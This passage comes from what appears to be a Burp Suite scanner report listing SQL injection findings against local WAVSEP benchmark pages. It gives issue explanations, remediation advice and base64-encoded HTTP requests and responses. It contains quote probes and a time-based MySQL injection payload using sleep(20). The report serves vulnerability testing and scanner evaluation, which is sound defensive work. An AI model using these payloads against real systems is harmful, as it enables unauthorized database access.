    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlQ3VycmVudFVzZXJEZXRhaWxzLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlQ3VycmVudFVzZXJEZXRhaWxzLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMzowOCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlQ3VycmVudFVzZXJEZXRhaWxzLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlQ3VycmVudFVzZXJEZXRhaWxzLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjA4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTkNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDcgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogUmV0cmlldmUgY3VycmVudCBkYXRhYmFzZSB1c2VyIGRldGFpbHMuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlQ3VycmVudFVzZXJEZXRhaWxzLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlQ3VycmVudFVzZXJEZXRhaWxzLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTkNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDcgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogUmV0cmlldmUgY3VycmVudCBkYXRhYmFzZSB1c2VyIGRldGFpbHMuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1856554893927135232</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case08-InjectionInSearch-RetrieveServerMAC-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case08-InjectionInSearch-RetrieveServerMAC-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA4LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlU2VydmVyTUFDLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA4LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlU2VydmVyTUFDLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMzo0MSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA4LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlU2VydmVyTUFDLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA4LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlU2VydmVyTUFDLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjQxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODgNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDggLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogUmV0cmlldmUgc2VydmVyIE1BQyBhZGRyZXNzLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
